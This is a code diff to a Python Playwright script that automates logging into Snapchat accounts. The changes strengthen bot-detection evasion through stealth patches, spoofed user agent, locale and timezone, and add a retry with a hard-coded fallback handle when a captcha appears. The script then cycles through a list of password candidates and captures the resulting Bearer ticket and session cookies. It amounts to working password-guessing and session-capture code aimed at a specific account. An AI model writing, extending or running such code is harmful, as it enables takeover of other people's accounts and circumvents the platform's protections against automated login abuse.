@@ -97,14 +97,21 @@ def update_github_secret(secret_name: str, secret_value: str):
         print(f"[GITHUB SECRET WARN] Failed to update {secret_name}: {e}")
 
 
+try:
+    from playwright_stealth import stealth_async
+except ImportError:
+    stealth_async = None
+
+
 async def browser_login_flow(username: str, passwords: list, existing_cookie: str = "") -> dict:
     """
     Stealth Playwright automation flow:
     1. Seeds existing cookies if present to test direct session resumption
     2. Navigates to accounts.snapchat.com/v2/login?continue=/accounts/sso
-    3. Types username/email and clicks Next
-    4. Enters password candidates
-    5. Network listener captures minted Bearer ticket (hCgw...) and updated session cookies
+    3. Types username/email and clicks Next (with visibility check)
+    4. Waits for password field to become genuinely visible (not hidden in DOM)
+    5. Enters password candidates (DM id wale1 priority)
+    6. Network listener captures minted Bearer ticket (hCgw...) and updated session cookies
     """
     print(f"\n=== LAUNCHING STEALTH BROWSER AUTH FLOW FOR {username} ===")
     captured_ticket = None
@@ -132,7 +139,9 @@ async def browser_login_flow(username: str, passwords: list, existing_cookie: st
         browser = await p.chromium.launch(**launch_kwargs)
         context = await browser.new_context(
             viewport={"width": 1280, "height": 800},
-            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
+            user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+            locale="en-US",
+            timezone_id="America/New_York"
         )
 
         # Seed existing session cookies into browser context if available
@@ -154,7 +163,7 @@ async def browser_login_flow(username: str, passwords: list, existing_cookie: st
             except Exception as e:
                 print(f"[BROWSER WARN] Could not seed cookies: {e}")
 
-        # Inject stealth scripts to mask automation signatures
+        # Inject stealth scripts
         await context.add_init_script("""
             Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
             window.chrome = { runtime: {}, loadTimes: function() {}, csi: function() {}, app: {} };
@@ -164,11 +173,12 @@ async def browser_login_flow(username: str, passwords: list, existing_cookie: st
                     Promise.resolve({ state: Notification.permission }) :
                     originalQuery(parameters)
             );
-            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
-            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
         """)
 
         page = await context.new_page()
+        if stealth_async:
+            await stealth_async(page)
+            print("[BROWSER] Applied playwright-stealth patches to page")
 
         # Monitor all network responses for tickets & sessions
         async def on_response(res):
@@ -207,106 +217,140 @@ async def browser_login_flow(username: str, passwords: list, existing_cookie: st
         # Dismiss cookie banner if present
         try:
             cookie_btn = await page.query_selector("button:has-text('Accept All'), button:has-text('Accept all cookies'), button#accept-recommended-btn-handler")
-            if cookie_btn:
+            if cookie_btn and await cookie_btn.is_visible():
                 await cookie_btn.click()
                 await page.wait_for_timeout(500)
         except Exception:
             pass
 
         # Step 1: Fill Account Identifier (Email / Username)
-        print("[STEP 1] Locating username / email field...")
-        account_input = await page.query_selector("input[name='accountIdentifier'], input#accountIdentifier, input[type='text'], input[autocomplete='username']")
-        if not account_input:
-            # Check if password field is already presented (e.g. remembered user)
-            account_input = await page.query_selector("input[type='password'], input[name='password']")
-            if not account_input:
+        print(f"[STEP 1] Locating username / email field (attempting: {username})...")
+        account_input = await page.wait_for_selector(
+            "input[name='accountIdentifier'], input#accountIdentifier, input[type='text']",
+            state="visible",
+            timeout=15000
+        )
+        await account_input.click()
+        await page.keyboard.press("Control+A")
+        await page.keyboard.press("Backspace")
+        await account_input.fill("")
+        await page.keyboard.type(username, delay=60)
+        await page.wait_for_timeout(500)
+        await page.screenshot(path="login_step1_username.png")
+
+        # Click Next
+        print("[STEP 1] Clicking 'Next' button...")
+        next_btn = await page.wait_for_selector(
+            "button:has-text('Next'), button[type='submit']",
+            state="visible",
+            timeout=8000
+        )
+        await next_btn.click()
+
+        # Step 2: Wait for Password input to become genuinely VISIBLE
+        print("[STEP 2] Waiting for password input to become visible...")
+        pwd_visible = False
+        for wait_s in range(15):
+            await page.wait_for_timeout(1000)
+            if captured_ticket or "easylens" in page.url:
+                break
+            try:
+                el = await page.query_selector("input[type='password']")
+                if el and await el.is_visible():
+                    pwd_visible = True
+                    break
+            except Exception:
+                pass
+
+        await page.screenshot(path="login_step2_password_screen.png")
+
+        # If password not visible and captcha triggered on email, try fallback handle (gman21478)
+        if not pwd_visible and not captured_ticket:
+            curr_url = page.url
+            print(f"[STEP 2 WARN] Password field not visible (URL: {curr_url}). Page Title: {await page.title()}")
+            fallback_user = "gman21478"
+            if username != fallback_user and ("captcha" in curr_url.lower() or "@" in username):
+                print(f"[STEP 1 RETRY] Retrying with Snapchat handle '{fallback_user}'...")
+                await page.goto(target_url, wait_until="domcontentloaded", timeout=30000)
+                await page.wait_for_timeout(2000)
                 try:
-                    account_input = await page.wait_for_selector(
-                        "input[name='accountIdentifier'], input#accountIdentifier, input[type='text']",
-                        timeout=10000
-                    )
-                except Exception:
-                    pass
-
-        if account_input and await account_input.get_attribute("type") != "password":
-            await account_input.click()
-            await account_input.fill("")
-            await page.keyboard.type(username, delay=50)
-            await account_input.dispatch_event("input")
-            await account_input.dispatch_event("change")
-            await page.wait_for_timeout(500)
-            await page.screenshot(path="login_step1_username.png")
-
-            # Click Next
-            print("[STEP 1] Clicking 'Next' button...")
-            next_btn = await page.query_selector("button[type='submit'], button:has-text('Next')")
-            if next_btn:
-                await next_btn.click()
-            else:
-                await page.keyboard.press("Enter")
-
-        # Step 2: Try password candidates
-        print(f"[STEP 2] Testing {len(passwords)} password candidate(s)...")
-        for attempt_idx, pwd in enumerate(passwords, 1):
-            if captured_ticket:
-                break
-            print(f"[STEP 2] Attempting password candidate #{attempt_idx}...")
-
-            # Re-query password field on every attempt to avoid stale DOM ElementHandle
-            pwd_el = None
-            for _ in range(15):
-                await page.wait_for_timeout(1000)
-                if captured_ticket:
-                    break
-                pwd_el = await page.query_selector("input[type='password'], input[name='password'], input#password")
-                if pwd_el:
-                    break
-
-            if not pwd_el and not captured_ticket:
-                print(f"[STEP 2 WARN] Password input element not found for attempt #{attempt_idx}")
-                print("Current URL:", page.url)
-                print("Page Title:", await page.title())
-                break
-
-            if pwd_el and not captured_ticket:
-                await pwd_el.click()
-                await page.keyboard.press("Control+A")
-                await page.keyboard.press("Backspace")
-                await pwd_el.fill("")
-                await page.keyboard.type(pwd, delay=50)
-                await pwd_el.dispatch_event("input")
-                await pwd_el.dispatch_event("change")
-                await page.wait_for_timeout(500)
-
-                submit_btn = await page.query_selector("button[type='submit'], button:has-text('Log In'), button:has-text('Sign In'), button:has-text('Log in')")
-                if submit_btn:
-                    await submit_btn.click()
-                else:
-                    await page.keyboard.press("Enter")
-
-                # Wait for response, redirect, or error notice
-                rejected = False
-                for wait_i in range(15):
-                    await page.wait_for_timeout(1000)
-                    if captured_ticket or "easylens" in page.url or "accounts/sso" in page.url:
-                        break
-                    err = await page.query_selector("p[class*='error'], div[class*='error'], span[class*='error'], [data-testid*='error']")
-                    if err:
-                        err_text = await err.inner_text()
-                        if any(w in err_text.lower() for w in ["incorrect", "wrong", "invalid", "try again"]):
-                            print(f"[STEP 2 WARN] Password #{attempt_idx} rejected: {err_text}")
-                            rejected = True
+                    account_input = await page.wait_for_selector("input[name='accountIdentifier'], input[type='text']", state="visible", timeout=10000)
+                    await account_input.click()
+                    await page.keyboard.press("Control+A")
+                    await page.keyboard.press("Backspace")
+                    await page.keyboard.type(fallback_user, delay=60)
+                    await page.wait_for_timeout(500)
+                    next_btn = await page.wait_for_selector("button:has-text('Next'), button[type='submit']", state="visible", timeout=8000)
+                    await next_btn.click()
+                    for _ in range(15):
+                        await page.wait_for_timeout(1000)
+                        el = await page.query_selector("input[type='password']")
+                        if el and await el.is_visible():
+                            pwd_visible = True
+                            print(f"[STEP 1 SUCCESS] Snapchat handle '{fallback_user}' revealed password field!")
                             break
+                    await page.screenshot(path="login_step2_fallback_screen.png")
+                except Exception as fb_err:
+                    print(f"[STEP 1 WARN] Fallback username attempt failed: {fb_err}")
 
-                await page.screenshot(path=f"login_step3_attempt_{attempt_idx}.png")
+        # Step 3: Try password candidates
+        if pwd_visible and not captured_ticket:
+            print(f"[STEP 3] Password field is VISIBLE. Testing {len(passwords)} password candidate(s)...")
+            for attempt_idx, pwd in enumerate(passwords, 1):
                 if captured_ticket:
-                    print("[STEP 2 SUCCESS] Authenticated successfully!")
                     break
-                if not rejected:
-                    await page.wait_for_timeout(3000)
+                print(f"[STEP 3] Attempting password candidate #{attempt_idx}...")
+
+                try:
+                    pwd_el = await page.wait_for_selector("input[type='password']", state="visible", timeout=8000)
+                except Exception:
+                    pwd_el = None
+
+                if not pwd_el and not captured_ticket:
+                    print(f"[STEP 3 WARN] Visible password element not found for attempt #{attempt_idx}")
+                    break
+
+                if pwd_el and not captured_ticket:
+                    await pwd_el.click()
+                    await page.keyboard.press("Control+A")
+                    await page.keyboard.press("Backspace")
+                    await pwd_el.fill("")
+                    await page.keyboard.type(pwd, delay=60)
+                    await page.wait_for_timeout(500)
+
+                    submit_btn = await page.wait_for_selector(
+                        "button:has-text('Log In'), button:has-text('Sign In'), button:has-text('Log in'), button[type='submit']:visible",
+                        state="visible",
+                        timeout=8000
+                    )
+                    if submit_btn:
+                        await submit_btn.click()
+                    else:
+                        await page.keyboard.press("Enter")
+
+                    # Wait for response, redirect, or error notice
+                    rejected = False
+                    for wait_i in range(15):
+                        await page.wait_for_timeout(1000)
+                        if captured_ticket or "easylens" in page.url or "accounts/sso" in page.url:
+                            break
+                        err = await page.query_selector("p[class*='error'], div[class*='error'], span[class*='error'], [data-testid*='error']")
+                        if err and await err.is_visible():
+                            err_text = await err.inner_text()
+                            if any(w in err_text.lower() for w in ["incorrect", "wrong", "invalid", "try again"]):
+                                print(f"[STEP 3 WARN] Password #{attempt_idx} rejected: {err_text}")
+                                rejected = True
+                                break
+
+                    await page.screenshot(path=f"login_step3_attempt_{attempt_idx}.png")
                     if captured_ticket:
-                        print("[STEP 2 SUCCESS] Authenticated successfully!")
+                        print("[STEP 3 SUCCESS] Authenticated successfully!")
                         break
+                    if not rejected:
+                        await page.wait_for_timeout(3000)
+                        if captured_ticket:
+                            print("[STEP 3 SUCCESS] Authenticated successfully!")
+                            break
 
         # Collect final cookies
         captured_cookies = await context.cookies()
